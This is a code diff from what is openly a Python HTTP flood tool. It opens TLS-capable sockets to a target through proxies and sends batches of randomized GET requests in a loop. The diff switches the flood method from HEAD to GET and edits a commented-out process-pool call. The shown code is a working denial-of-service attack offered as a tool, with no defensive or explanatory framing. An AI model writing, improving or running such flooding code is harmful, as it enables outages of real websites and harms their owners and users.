@@ -116,7 +116,7 @@ def Flood():
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
             for _ in range(100):
                 valueParams = "?{}={}".format(rC(queryParams), rI(1, 65535))
-                floodHeader = "HEAD {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
+                floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
                 floodHeader = floodHeader.encode()
                 s.send(floodHeader)
             print("Flood sent " + proxy[0] + ":" + proxy[1])
@@ -152,6 +152,6 @@ for indexPicker in range(threadNumber):
 for process in processList:
     process.join()"""
 #darkdarkbruhbruhlmaolmao = multiprocessing.Pool(processes=threadNumber)
-#darkdarkbruhbruhlmaolmao.map(Flood, range(500))
+#darkdarkbruhbruhlmaolmao.map(Flood, 1)
 while True:
     input()
